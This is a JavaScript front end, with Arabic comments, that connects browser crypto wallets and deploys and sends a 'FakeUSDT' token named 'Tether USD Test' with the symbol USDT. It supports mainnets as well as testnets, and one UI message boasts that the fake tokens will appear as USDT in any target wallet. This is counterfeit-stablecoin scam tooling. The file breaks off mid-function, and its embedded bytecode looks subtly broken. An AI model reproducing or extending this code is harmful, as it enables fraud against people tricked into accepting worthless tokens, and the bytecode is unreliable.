// عناصر DOM
const networkStatus = document.getElementById('network-status');
const walletStatus = document.getElementById('wallet-status');
const networkSelect = document.getElementById('network-select');
const deployBtn = document.getElementById('deploy-btn');
const skipDeployBtn = document.getElementById('skip-deploy-btn');
const connectBtn = document.getElementById('connect-btn');
const contractAddress = document.getElementById('contract-address');
const deployTab = document.getElementById('deploy-tab');
const connectTab = document.getElementById('connect-tab');
const deployForm = document.getElementById('deploy-form');
const connectForm = document.getElementById('connect-form');
const deployResult = document.getElementById('deploy-result');
const sendBtn = document.getElementById('send-btn');
const multiSendBtn = document.getElementById('multi-send-btn');
const sendResult = document.getElementById('send-result');
const recipientAddress = document.getElementById('recipient-address');
const tokenAmount = document.getElementById('token-amount');
const multiRecipients = document.getElementById('multi-recipients');
const multiAmount = document.getElementById('multi-amount');
const singleTab = document.getElementById('single-tab');
const multiTab = document.getElementById('multi-tab');
const singleForm = document.getElementById('single-form');
const multiForm = document.getElementById('multi-form');
const transactionsList = document.getElementById('transactions-list');
const exportBtn = document.getElementById('export-btn');
const importBtn = document.getElementById('import-btn');
const clearBtn = document.getElementById('clear-btn');
const importFile = document.getElementById('import-file');

// متغيرات عالمية
let provider;
let signer;
let fakeUSDTContract;
let fakeUSDTAddress;
let transactions = [];
let selectedNetwork = 'sepolia';

// تحميل المعاملات من التخزين المحلي إذا كانت موجودة
try {
    const savedTransactions = localStorage.getItem('fakeUSDT_transactions');
    if (savedTransactions) {
        transactions = JSON.parse(savedTransactions);
    }
} catch (error) {
    console.error('Error loading transactions from localStorage:', error);
}

// معلومات الشبكات المدعومة
const NETWORKS = {
    // شبكات الاختبار
    sepolia: {
        chainId: '0xaa36a7', // 11155111 بالعشري
        chainName: 'Sepolia Test Network',
        nativeCurrency: {
            name: 'Sepolia Ether',
            symbol: 'ETH',
            decimals: 18
        },
        rpcUrls: ['https://sepolia.infura.io/v3/'],
        blockExplorerUrls: ['https://sepolia.etherscan.io'],
        gasPrice: '5000000000' // 5 gwei
    },
    bsc_testnet: {
        chainId: '0x61', // 97 بالعشري
        chainName: 'BSC Testnet',
        nativeCurrency: {
            name: 'Binance Coin',
            symbol: 'BNB',
            decimals: 18
        },
        rpcUrls: ['https://endpoints.omniatech.io/v1/bsc/testnet/public', 'https://data-seed-prebsc-1-s1.binance.org:8545/'],
        blockExplorerUrls: ['https://testnet.bscscan.com'],
        gasPrice: '1000000000' // 1 gwei
    },
    mumbai: {
        chainId: '0x13881', // 80001 بالعشري
        chainName: 'Mumbai Testnet',
        nativeCurrency: {
            name: 'MATIC',
            symbol: 'MATIC',
            decimals: 18
        },
        rpcUrls: ['https://polygon-mumbai.infura.io/v3/'],
        blockExplorerUrls: ['https://mumbai.polygonscan.com'],
        gasPrice: '1500000000' // 1.5 gwei
    },
    // الشبكات الرئيسية
    bsc: {
        chainId: '0x38', // 56 بالعشري
        chainName: 'BNB Smart Chain',
        nativeCurrency: {
            name: 'Binance Coin',
            symbol: 'BNB',
            decimals: 18
        },
        rpcUrls: ['https://bsc-dataseed1.binance.org/', 'https://bsc-dataseed2.binance.org/', 'https://bsc-dataseed3.binance.org/', 'https://bsc-dataseed4.binance.org/'],
        blockExplorerUrls: ['https://bscscan.com'],
        gasPrice: '1000000000' // 1 gwei
    },
    polygon: {
        chainId: '0x89', // 137 بالعشري
        chainName: 'Polygon Mainnet',
        nativeCurrency: {
            name: 'MATIC',
            symbol: 'MATIC',
            decimals: 18
        },
        rpcUrls: ['https://polygon-mainnet.infura.io/v3/'],
        blockExplorerUrls: ['https://polygonscan.com'],
        gasPrice: '30000000000' // 30 gwei
    },
    arbitrum: {
        chainId: '0xa4b1', // 42161 بالعشري
        chainName: 'Arbitrum One',
        nativeCurrency: {
            name: 'Ethereum',
            symbol: 'ETH',
            decimals: 18
        },
        rpcUrls: ['https://arbitrum-mainnet.infura.io/v3/'],
        blockExplorerUrls: ['https://arbiscan.io'],
        gasPrice: '100000000' // 0.1 gwei
    },
    optimism: {
        chainId: '0xa', // 10 بالعشري
        chainName: 'Optimism',
        nativeCurrency: {
            name: 'Ethereum',
            symbol: 'ETH',
            decimals: 18
        },
        rpcUrls: ['https://optimism-mainnet.infura.io/v3/'],
        blockExplorerUrls: ['https://optimistic.etherscan.io'],
        gasPrice: '1000000' // 0.001 gwei
    },
    base: {
        chainId: '0x2105', // 8453 بالعشري
        chainName: 'Base',
        nativeCurrency: {
            name: 'Ethereum',
            symbol: 'ETH',
            decimals: 18
        },
        rpcUrls: ['https://base-mainnet.g.alchemy.com/v2/'],
        blockExplorerUrls: ['https://basescan.org'],
        gasPrice: '10000000' // 0.01 gwei
    },
    mainnet: {
        chainId: '0x1', // 1 بالعشري
        chainName: 'Ethereum Mainnet',
        nativeCurrency: {
            name: 'Ethereum',
            symbol: 'ETH',
            decimals: 18
        },
        rpcUrls: ['https://mainnet.infura.io/v3/'],
        blockExplorerUrls: ['https://etherscan.io'],
        gasPrice: '20000000000' // 20 gwei
    }
};

// ABI للعقد الذكي FakeUSDT (مبسط)
const fakeUSDTAbi = [
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "account",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "decimals",
        "outputs": [
            {
                "internalType": "uint8",
                "name": "",
                "type": "uint8"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "mint",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "name",
        "outputs": [
            {
                "internalType": "string",
                "name": "",
                "type": "string"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "symbol",
        "outputs": [
            {
                "internalType": "string",
                "name": "",
                "type": "string"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// كود العقد الذكي FakeUSDT (مبسط)
const fakeUSDTBytecode = "0x60806040523480156200001157600080fd5b506040518060400160405280600f81526020017f54657468657220555344205465737400000000000000000000000000000000008152506040518060400160405280600481526020017f555344540000000000000000000000000000000000000000000000000000000081525060066000908051906020019062000096929190620000c8565b508051620000ac906001906020840190620000c8565b5060028054600160ff1990911617905534801562000129575b50620001d3565b828054620000d6906200019c565b90600052602060002090601f0160209004810192826200010a5760008555620001a1565b82601f106200012557805160ff1916838001178555620001a1565b82800160010185558215620001a1579182015b82811115620001a1578251825591602001919060010190620001a1565b50620001af929150620001b3565b5090565b5b80821115620001af5760008155600101620001b4565b600181811c90821680620001b157607f821691505b60208210810362000132577f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b50919050565b6108e380620001e36000396000f3fe608060405234801561001057600080fd5b50600436106100625760003560e01c806306fdde03146100675780631249c58b1461008557806318160ddd1461008f57806323b872dd146100a6578063313ce567146100b957806370a08231146100ce57806395d89b4114610107578063a9059cbb1461010f578063aa271e1a14610122575b600080fd5b61006f610135565b60405161007c9190610761565b60405180910390f35b61008d6101c3565b005b6003545b60405190815260200161007c565b6100b96100b4366004610772565b6101e5565b005b6002546100c69060ff1681565b60405160ff909116815260200161007c565b6100936100dc3660046107ae565b6001600160a01b031660009081526004602052604090205490565b61006f610274565b61008d61011d3660046107c9565b610281565b6100936101303660046107ae565b50600190565b6000805461014290610802565b80601f016020809104026020016040519081016040528092919081815260200182805461016e90610802565b80156101bb5780601f10610190576101008083540402835291602001916101bb565b820191906000526020600020905b81548152906001019060200180831161019e57829003601f168201915b505050505081565b6001600160a01b03331660009081526004602052604090208054346101e190610853565b9055565b6001600160a01b03831660009081526004602052604090205481111561020957600080fd5b6001600160a01b03821660009081526004602052604081208054839290610232908490610853565b90915550506001600160a01b0383166000908152600460205260408120805483929061025f90849061086b565b90915550505b505050565b6001805461014290610802565b6001600160a01b0382166000908152600460205260408120805483929061025f908490610853565b600081518084526020808501945080840160005b838110156102e557815187529582019590820190600101610a58565b509495945050505050565b602081526000825180602084015261040060408401826102c1565b601f01601f19169190910160400192915050565b80356001600160a01b038116811461042a57600080fd5b919050565b634e487b7160e01b600052604160045260246000fd5b600082601f83011261045657600080fd5b813567ffffffffffffffff8082111561047157610471610a2f565b604051601f8301601f19908116603f0116810190828211818310171561049957610499610a2f565b816040528381528660208588010111156104b257600080fd5b836020870160208301376000602085830101528094505050505092915050565b600080604083850312156104e557600080fd5b6104ee83610413565b946020939093013593505050565b60006020828403121561050e57600080fd5b61051782610413565b9392505050565b600181811c9082168061053157607f821691505b6020821081036105515763b95aa35560e01b600052602260045260246000fd5b50919050565b6000825161056981846020870161099c565b9190910192915050565b600082198211156105a8577f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b500190565b600082821015610a7f577f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60005b838110156105f85781810151838201526020016105e0565b8381111561060757600083601f840112610607565b50505b505050565b600081518084526106258160208601602086016105dd565b601f01601f19169290920160200192915050565b6020815260006106a0602083018461060d565b9392505050565b600080600060608486031215610a7f57600080fd5b610a7f84610413565b610a7f60208501610413565b600060208284031215610a7f57600080fd5b600060208284031215610a7f57600080fd5b60008060408385031215610a7f57600080fd5b610a7f83610413565b610a7f60208401610413565b600181811c90821680610a7f57607f821691505b60208210810361099c5763b95aa35560e01b600052602260045260246000fd5b634e487b7160e01b600052604160045260246000fd5b60008151808452610a7f8160208601602086016105dd565b601f01601f19169290920160200192915050565b60208152600061099c602083018461060d565b60006020828403121561099c57600080fd5b61099c82610413565b600080604083850312156109a957600080fd5b6109a983610413565b946020939093013593505050565b60005b838110156109d75781810151838201526020016109bf565b838111156109e6576000848401525b50505050565b600081518084526109a98160208601602086016109bc565b601f01601f19169290920160200192915050565b602081526000610a0b60208301846109ce565b9392505050565b634e487b7160e01b600052601160045260246000fd5b600082821015610a5a57610a5a610a16565b500390565b60008219821115610a7d57610a7d610a16565b500190565b60006001820161099c5761099c610a16565b600082610a9e57610a9e610a16565b50069056fea2646970667358221220d9c7b0d94b1f4e2e73e4360871b8b036e7a29e9e75b6f131b5e4a0c3d5d3b8d264736f6c63430008110033";

// متغيرات لتخزين المعلومات المحفوظة
let preferredWallet = localStorage.getItem('preferred_wallet');
let savedContractAddress = localStorage.getItem('fakeUSDT_contract_address');
let savedContractNetwork = localStorage.getItem('fakeUSDT_contract_network');

// دالة التهيئة
async function init() {
    updateNetworkStatus('جاري التحقق من المحافظ المتاحة...');

    try {
        console.log("بدء تهيئة التطبيق...");

        // التحقق من وجود محافظ متعددة
        const providers = detectWalletProviders();
        console.log("المحافظ المكتشفة:", Object.keys(providers));

        if (Object.keys(providers).length === 0) {
            // لا توجد محافظ متاحة
            updateNetworkStatus(`
                <div class="error">خطأ: لم يتم العثور على أي محفظة</div>
                <div style="margin-top: 10px;">
                    يمكنك تثبيت إحدى المحافظ التالية:
                    <div class="button-group" style="margin-top: 10px;">
                        <a href="https://metamask.io/download/" target="_blank" class="primary-btn">تثبيت MetaMask</a>
                        <a href="https://trustwallet.com/browser-extension" target="_blank" class="primary-btn">تثبيت Trust Wallet</a>
                    </div>
                </div>
            `, 'error');
            return;
        }

        // عرض خيارات المحافظ المتاحة دائمًا
        showWalletOptions(providers, preferredWallet);

        // إذا كان هناك محفظة مفضلة محفوظة، أضف رسالة توضيحية
        if (preferredWallet) {
            console.log("تم العثور على محفظة مفضلة:", preferredWallet);
            updateNetworkStatus(prevHTML => {
                return `
                    <div class="info" style="margin-bottom: 15px;">المحفظة المفضلة الحالية: <strong>${preferredWallet}</strong></div>
                    ${prevHTML}
                `;
            });
        }

        // الاستماع لأحداث تغيير الشبكة المحددة
        networkSelect.addEventListener('change', handleNetworkSelectChange);
    } catch (error) {
        console.error("خطأ في تهيئة التطبيق:", error);
        updateNetworkStatus(`خطأ: ${error.message}`, 'error');
    }
}

// دالة عرض خيارات المحافظ
function showWalletOptions(providers, preferredWallet = null) {
    let walletOptionsHTML = `
        <div>يرجى اختيار المحفظة التي تريد استخدامها:</div>
        <div class="wallet-options" style="margin-top: 15px; display: flex; flex-wrap: wrap; justify-content: center;">
    `;

    // إضافة أزرار للمحافظ المتاحة
    for (const [name, provider] of Object.entries(providers)) {
        const walletIcon = WALLET_ICONS[name] || WALLET_ICONS['محفظة أخرى'];
        const isPreferred = name === preferredWallet;

        walletOptionsHTML += `
            <button class="wallet-option-btn ${isPreferred ? 'primary-btn' : 'secondary-btn'}"
                    style="margin: 5px; display: flex; align-items: center; min-width: 150px; justify-content: center; ${isPreferred ? 'border: 2px solid gold;' : ''}"
                    onclick="connectToSpecificWallet('${name}')">
                <img src="${walletIcon}"
                     alt="${name}" style="width: 24px; height: 24px; margin-left: 10px;" />
                ${name} ${isPreferred ? '(المفضلة)' : ''}
            </button>
        `;
    }

    walletOptionsHTML += `</div>`;

    updateNetworkStatus(walletOptionsHTML);
}

// دالة استعادة العقد المحفوظ
async function restoreSavedContract() {
    try {
        // التحقق من أن المستخدم متصل بالشبكة الصحيحة
        const network = await provider.getNetwork();
        const networkInfo = getNetworkInfoByChainId(network.chainId);

        if (!networkInfo) {
            console.log("الشبكة الحالية غير مدعومة، لا يمكن استعادة العقد");
            return;
        }

        const savedNetworkInfo = NETWORKS[savedContractNetwork];

        // إذا كانت الشبكة الحالية مختلفة عن الشبكة المحفوظة، اسأل المستخدم إذا كان يريد التبديل
        if (networkInfo.id !== savedContractNetwork) {
            const shouldSwitch = confirm(`
                العقد المحفوظ موجود على شبكة ${savedNetworkInfo.chainName}،
                لكنك متصل حالياً بشبكة ${networkInfo.chainName}.
                هل تريد التبديل إلى شبكة ${savedNetworkInfo.chainName}؟
            `);

            if (shouldSwitch) {
                await switchNetwork(savedContractNetwork);
                // بعد التبديل، سيتم إعادة تحميل الصفحة، لذلك لا داعي للاستمرار
                return;
            }
        }

        // إنشاء كائن العقد
        fakeUSDTContract = new ethers.Contract(savedContractAddress, fakeUSDTAbi, signer);
        fakeUSDTAddress = savedContractAddress;

        // محاولة استدعاء دالة من العقد للتحقق من صحته
        try {
            const symbol = await fakeUSDTContract.symbol();
            const name = await fakeUSDTContract.name();

            // الحصول على رابط المسح الضوئي للعقد
            const explorerUrl = networkInfo.blockExplorerUrls[0] + '/address/' + fakeUSDTAddress;

            // تحديث النتيجة
            updateDeployResult(`
                <div class="success">تم استعادة العقد المحفوظ بنجاح!</div>
                <div><strong>اسم العقد:</strong> ${name}</div>
                <div><strong>الرمز:</strong> ${symbol}</div>
                <div><strong>عنوان العقد:</strong> <span dir="ltr">${fakeUSDTAddress}</span></div>
                <div><strong>الشبكة:</strong> ${networkInfo.chainName}</div>
                <div><a href="${explorerUrl}" target="_blank" class="explorer-link">عرض العقد في المسح الضوئي</a></div>
                <div class="info" style="margin-top: 10px;">
                    <strong>ملاحظة هامة:</strong> يمكنك الآن إرسال توكنات USDT مزيفة إلى أي محفظة. ستظهر هذه التوكنات في المحفظة المستهدفة كتوكنات USDT.
                </div>
            `, 'success');

            // تفعيل أزرار الإرسال
            sendBtn.disabled = false;
            multiSendBtn.disabled = false;

        } catch (error) {
            console.error('Error verifying saved contract:', error);

            // إذا فشل التحقق، امسح العقد المحفوظ
            localStorage.removeItem('fakeUSDT_contract_address');
            localStorage.removeItem('fakeUSDT_contract_network');
            savedContractAddress = null;
            savedContractNetwork = null;

            updateDeployResult(`
                <div class="error">فشل استعادة العقد المحفوظ</div>
                <div>يبدو أن العقد المحفوظ غير صالح أو غير متاح على الشبكة الحالية.</div>
                <div>يرجى نشر عقد جديد.</div>
            `, 'error');
        }

    } catch (error) {
        console.error('Error restoring saved contract:', error);
    }
}

// دالة اكتشاف محافظ الويب المتاحة
function detectWalletProviders() {
    const providers = {};
    console.log("بدء اكتشاف المحافظ المتاحة...");

    try {
        // التحقق من وجود محافظ متعددة
        if (window.ethereum && window.ethereum.providers) {
            console.log("تم اكتشاف محافظ متعددة:", window.ethereum.providers);

            // المتصفح يدعم محافظ متعددة
            window.ethereum.providers.forEach((provider, index) => {
                console.log(`فحص المزود ${index}:`, provider);

                // طباعة جميع خصائص المزود للتشخيص
                for (const key in provider) {
                    if (key.startsWith('is')) {
                        console.log(`- الخاصية ${key}:`, provider[key]);
                    }
                }

                // التحقق من MetaMask (مع التأكد من أنه ليس Trust Wallet)
                if (provider.isMetaMask && !provider.isTrust && !provider.isTrustWallet) {
                    providers['MetaMask'] = provider;
                    console.log("تم اكتشاف MetaMask");
                }

                // التحقق من Trust Wallet
                if (provider.isTrust || provider.isTrustWallet) {
                    providers['Trust Wallet'] = provider;
                    console.log("تم اكتشاف Trust Wallet");
                }

                if (provider.isCoinbaseWallet || provider.isCoinbaseBrowser) {
                    providers['Coinbase Wallet'] = provider;
                    console.log("تم اكتشاف Coinbase Wallet");
                }

                if (provider.isTokenPocket) {
                    providers['TokenPocket'] = provider;
                    console.log("تم اكتشاف TokenPocket");
                }

                if (provider.isImToken) {
                    providers['imToken'] = provider;
                    console.log("تم اكتشاف imToken");
                }

                if (provider.isMathWallet) {
                    providers['MathWallet'] = provider;
                    console.log("تم اكتشاف MathWallet");
                }

                if (provider.isOKExWallet || provider.isOKXWallet) {
                    providers['OKX Wallet'] = provider;
                    console.log("تم اكتشاف OKX Wallet");
                }

                // إذا لم يتم التعرف على المزود، أضفه كمحفظة عامة
                if (!Object.values(providers).includes(provider)) {
                    const genericName = `محفظة الويب ${index + 1}`;
                    providers[genericName] = provider;
                    console.log(`تم إضافة ${genericName} (غير معروفة)`);
                }
            });
        } else if (window.ethereum) {
            console.log("تم اكتشاف محفظة واحدة فقط:", window.ethereum);

            // طباعة جميع خصائص المزود للتشخيص
            for (const key in window.ethereum) {
                if (key.startsWith('is')) {
                    console.log(`- الخاصية ${key}:`, window.ethereum[key]);
                }
            }

            // المتصفح يدعم محفظة واحدة فقط
            // التحقق من وجود MetaMask (مع التأكد من أنه ليس Trust Wallet)
            if (window.ethereum.isMetaMask && !window.ethereum.isTrust && !window.ethereum.isTrustWallet) {
                providers['MetaMask'] = window.ethereum;
                console.log("تم اكتشاف MetaMask");
            }
            // التحقق من وجود Trust Wallet
            if (window.ethereum.isTrust || window.ethereum.isTrustWallet) {
                providers['Trust Wallet'] = window.ethereum;
                console.log("تم اكتشاف Trust Wallet");
            }
            // التحقق من وجود Coinbase Wallet
            if (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbaseBrowser) {
                providers['Coinbase Wallet'] = window.ethereum;
                console.log("تم اكتشاف Coinbase Wallet");
            }
            // التحقق من وجود TokenPocket
            if (window.ethereum.isTokenPocket) {
                providers['TokenPocket'] = window.ethereum;
                console.log("تم اكتشاف TokenPocket");
            }
            // التحقق من وجود imToken
            if (window.ethereum.isImToken) {
                providers['imToken'] = window.ethereum;
                console.log("تم اكتشاف imToken");
            }
            // التحقق من وجود MathWallet
            if (window.ethereum.isMathWallet) {
                providers['MathWallet'] = window.ethereum;
                console.log("تم اكتشاف MathWallet");
            }
            // التحقق من وجود OKX Wallet
            if (window.ethereum.isOKExWallet || window.ethereum.isOKXWallet) {
                providers['OKX Wallet'] = window.ethereum;
                console.log("تم اكتشاف OKX Wallet");
            }

            // إذا لم يتم التعرف على أي محفظة، أضف محفظة عامة
            if (Object.keys(providers).length === 0) {
                providers['محفظة الويب'] = window.ethereum;
                console.log("تم إضافة محفظة الويب (غير معروفة)");
            }
        }

        // إذا لم يتم العثور على أي محفظة، أضف خيار "محفظة الويب" للمستخدمين الذين يستخدمون محفظة غير معروفة
        if (Object.keys(providers).length === 0 && window.ethereum) {
            providers['محفظة الويب'] = window.ethereum;
        }

        // التحقق من وجود WalletConnect
        if (window.ethereum && window.ethereum.isWalletConnect) {
            providers['WalletConnect'] = window.ethereum;
        }

        // إذا كان هناك محفظة مفضلة محفوظة، ضعها في المقدمة
        if (preferredWallet && providers[preferredWallet]) {
            const preferred = providers[preferredWallet];
            delete providers[preferredWallet];

            // إعادة ترتيب المحافظ لوضع المفضلة في المقدمة
            const orderedProviders = {
                [preferredWallet]: preferred
            };

            // إضافة باقي المحافظ
            Object.keys(providers).forEach(key => {
                orderedProviders[key] = providers[key];
            });

            return orderedProviders;
        }
    } catch (error) {
        console.error("خطأ في اكتشاف المحافظ:", error);
        // في حالة حدوث خطأ، حاول استخدام المزود الافتراضي
        if (window.ethereum) {
            providers['محفظة الويب'] = window.ethereum;
        }
    }

    return providers;
}

// دالة الاتصال بمحفظة محددة
async function connectToSpecificWallet(walletName) {
    try {
        updateNetworkStatus(`جاري الاتصال بـ ${walletName}...`);
        console.log(`محاولة الاتصال بـ ${walletName}...`);

        // تحديد المزود المناسب
        let selectedProvider = null;
        let availableProviders = [];

        // التحقق من وجود محافظ متعددة
        if (window.ethereum && window.ethereum.providers) {
            console.log("تم اكتشاف محافظ متعددة:", window.ethereum.providers);
            availableProviders = window.ethereum.providers;

            // طباعة معلومات مفصلة عن جميع المزودين المتاحين
            console.log("معلومات مفصلة عن المزودين المتاحين:");
            window.ethereum.providers.forEach((provider, index) => {
                console.log(`المزود ${index}:`, provider);
                for (const key in provider) {
                    if (key.startsWith('is')) {
                        console.log(`- الخاصية ${key}:`, provider[key]);
                    }
                }
            });

            // البحث عن المزود المطلوب في قائمة المزودين
            if (walletName === 'MetaMask') {
                // البحث عن MetaMask بشكل دقيق
                for (const provider of window.ethereum.providers) {
                    // التحقق من أنه MetaMask وليس Trust Wallet
                    if (provider.isMetaMask && !provider.isTrust && !provider.isTrustWallet) {
                        console.log("تم العثور على MetaMask:", provider);
                        selectedProvider = provider;
                        break;
                    }
                }

                // إذا لم يتم العثور على MetaMask، ابحث عن أي مزود يدعي أنه MetaMask
                if (!selectedProvider) {
                    for (const provider of window.ethereum.providers) {
                        if (provider.isMetaMask) {
                            console.log("تم العثور على مزود يدعي أنه MetaMask:", provider);
                            selectedProvider = provider;
                            break;
                        }
                    }
                }
            } else if (walletName === 'Trust Wallet') {
                // البحث عن Trust Wallet
                for (const provider of window.ethereum.providers) {
                    if (provider.isTrust || provider.isTrustWallet) {
                        console.log("تم العثور على Trust Wallet:", provider);
                        selectedProvider = provider;
                        break;
                    }
                }
            } else if (walletName === 'Coinbase Wallet') {
                // البحث عن Coinbase Wallet
                for (const provider of window.ethereum.providers) {
                    if (provider.isCoinbaseWallet || provider.isCoinbaseBrowser) {
                        console.log("تم العثور على Coinbase Wallet:", provider);
                        selectedProvider = provider;
                        break;
                    }
                }
            } else {
                // البحث عن المحفظة بالاسم
                for (const provider of window.ethereum.providers) {
                    // محاولة مطابقة الاسم مع خصائص المزود
                    let found = false;
                    for (const key in provider) {
                        if (key.startsWith('is') && key.toLowerCase().includes(walletName.toLowerCase())) {
                            console.log(`تم العثور على ${walletName} من خلال الخاصية ${key}:`, provider);
                            selectedProvider = provider;
                            found = true;
                            break;
                        }
                    }
                    if (found) break;
                }
            }
        } else if (window.ethereum) {
            console.log("تم اكتشاف محفظة واحدة فقط:", window.ethereum);
            availableProviders = [window.ethereum];

            // طباعة جميع خصائص المزود للتشخيص
            console.log("خصائص المزود الوحيد:");
            for (const key in window.ethereum) {
                if (key.startsWith('is')) {
                    console.log(`- الخاصية ${key}:`, window.ethereum[key]);
                }
            }

            // في حالة وجود مزود واحد فقط، استخدمه بغض النظر عن نوعه
            console.log("استخدام المزود الوحيد المتاح");
            selectedProvider = window.ethereum;

            // تحديث اسم المحفظة بناءً على خصائص المزود
            if (window.ethereum.isMetaMask && !window.ethereum.isTrust && !window.ethereum.isTrustWallet) {
                console.log("المزود الوحيد هو MetaMask");
                walletName = 'MetaMask';
            } else if (window.ethereum.isTrust || window.ethereum.isTrustWallet) {
                console.log("المزود الوحيد هو Trust Wallet");
                walletName = 'Trust Wallet';
            } else if (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbaseBrowser) {
                console.log("المزود الوحيد هو Coinbase Wallet");
                walletName = 'Coinbase Wallet';
            } else {
                console.log("المزود الوحيد غير معروف، استخدام الاسم الافتراضي");
                walletName = 'محفظة الويب';
            }
        }

        // إذا لم يتم العثور على المزود المطلوب
        if (!selectedProvider) {
            console.error(`لم يتم العثور على المحفظة المحددة: ${walletName}`);

            // عرض رسالة للمستخدم
            updateNetworkStatus(`
                <div class="error">لم يتم العثور على المحفظة المحددة: ${walletName}</div>
                <div style="margin-top: 10px;">المحافظ المتاحة:</div>
                <div id="available-wallets" style="margin-top: 10px;"></div>
                <div style="margin-top: 10px;">
                    <button class="primary-btn" onclick="init()">محاولة مرة أخرى</button>
                    <button class="secondary-btn" onclick="window.location.reload()">إعادة تحميل الصفحة</button>
                </div>
            `, 'error');

            // عرض المحافظ المتاحة
            const availableWalletsDiv = document.getElementById('available-wallets');
            if (availableWalletsDiv) {
                for (const provider of availableProviders) {
                    const walletInfo = document.createElement('div');
                    walletInfo.style.margin = '5px 0';

                    let detectedWalletName = 'محفظة غير معروفة';
                    if (provider.isMetaMask && !provider.isTrust && !provider.isTrustWallet) detectedWalletName = 'MetaMask';
                    else if (provider.isTrust || provider.isTrustWallet) detectedWalletName = 'Trust Wallet';
                    else if (provider.isCoinbaseWallet || provider.isCoinbaseBrowser) detectedWalletName = 'Coinbase Wallet';
                    else if (provider.isTokenPocket) detectedWalletName = 'TokenPocket';
                    else if (provider.isImToken) detectedWalletName = 'imToken';
                    else if (provider.isMathWallet) detectedWalletName = 'MathWallet';
                    else if (provider.isOKExWallet || provider.isOKXWallet) detectedWalletName = 'OKX Wallet';

                    walletInfo.textContent = `- ${detectedWalletName}`;
                    availableWalletsDiv.appendChild(walletInfo);
                }
            }

            return;
        }

        // طلب الاتصال بالمحفظة
        console.log("طلب الاتصال بالمحفظة:", selectedProvider);
        const accounts = await selectedProvider.request({ method: 'eth_requestAccounts' });
        console.log("الحسابات المتاحة:", accounts);

        if (accounts.length === 0) {
            updateNetworkStatus('خطأ: لم يتم اختيار أي حساب', 'error');
            return;
        }

        // حفظ المحفظة المفضلة
        localStorage.setItem('preferred_wallet', walletName);
        preferredWallet = walletName;

        // إنشاء مزود الإيثيريوم
        console.log("إنشاء مزود الإيثيريوم باستخدام:", selectedProvider);
        provider = new ethers.providers.Web3Provider(selectedProvider);

        // إضافة مستمعي الأحداث
        selectedProvider.on('accountsChanged', handleAccountsChanged);
        selectedProvider.on('chainChanged', handleChainChanged);

        // الحصول على الموقع
        signer = provider.getSigner();
        console.log("تم الحصول على الموقع:", signer);

        // الحصول على عنوان المحفظة
        const address = await signer.getAddress();
        console.log("عنوان المحفظة:", address);
        updateWalletStatus(`${walletName}: ${formatAddress(address)}`);

        // الحصول على معلومات الشبكة
        const network = await provider.getNetwork();
        console.log("معلومات الشبكة:", network);

        // التحقق من الشبكة
        const networkInfo = getNetworkInfoByChainId(network.chainId);
        console.log("معلومات الشبكة المستخرجة:", networkInfo);

        if (networkInfo) {
            // تحديث الشبكة المحددة
            selectedNetwork = networkInfo.id;
            networkSelect.value = selectedNetwork;

            updateNetworkStatus(`
                <div class="success">متصل بشبكة: ${networkInfo.chainName} (${walletName})</div>
                <div style="margin-top: 10px; font-size: 0.9em; display: flex; gap: 10px; justify-content: center;">
                    <button class="secondary-btn" onclick="forgetWallet()" style="font-size: 0.9em;">نسيان المحفظة المفضلة</button>
                    <button class="secondary-btn" onclick="changeWallet()" style="font-size: 0.9em;">تغيير المحفظة</button>
                </div>
            `, 'success');

            // تفعيل الأزرار
            deployBtn.disabled = false;

            // استعادة العقد المحفوظ إذا كان موجودًا
            if (savedContractAddress && savedContractNetwork) {
                console.log("محاولة استعادة العقد المحفوظ:", savedContractAddress, "على شبكة", savedContractNetwork);
                await restoreSavedContract();
            }
        } else {
            updateNetworkStatus(`
                <div class="error">خطأ: الشبكة الحالية غير مدعومة (${network.name})</div>
                <div id="switch-network-container"></div>
            `, 'error');

            // إضافة زر للتبديل إلى شبكة مدعومة
            const switchButton = document.createElement('button');
            switchButton.textContent = 'التبديل إلى شبكة مدعومة';
            switchButton.className = 'primary-btn';
            switchButton.style.marginTop = '10px';
            switchButton.onclick = () => switchNetwork(selectedNetwork);
            document.getElementById('switch-network-container').appendChild(switchButton);
        }
    } catch (error) {
        console.error("خطأ في الاتصال بالمحفظة:", error);
        if (error.code === 4001) {
            // المستخدم رفض الاتصال
            updateNetworkStatus(`
                <div class="error">تم رفض الاتصال بالمحفظة</div>
                <div>يرجى الموافقة على الاتصال بالمحفظة للمتابعة</div>
                <div style="margin-top: 10px;">
                    <button class="primary-btn" onclick="init()">محاولة مرة أخرى</button>
                    <button class="secondary-btn" onclick="window.location.reload()">إعادة تحميل الصفحة</button>
                </div>
            `, 'error');
        } else {
            updateNetworkStatus(`
                <div class="error">خطأ: ${error.message}</div>
                <div style="margin-top: 10px;">
                    <button class="primary-btn" onclick="init()">محاولة مرة أخرى</button>
                    <button class="secondary-btn" onclick="window.location.reload()">إعادة تحميل الصفحة</button>
                </div>
            `, 'error');
        }
    }
}

// دالة لنسيان المحفظة المفضلة
function forgetWallet() {
    localStorage.removeItem('preferred_wallet');
    preferredWallet = null;

    // إزالة معلومات العقد المحفوظة أيضًا لضمان إعادة الاتصال بشكل صحيح
    localStorage.removeItem('fakeUSDT_contract_address');
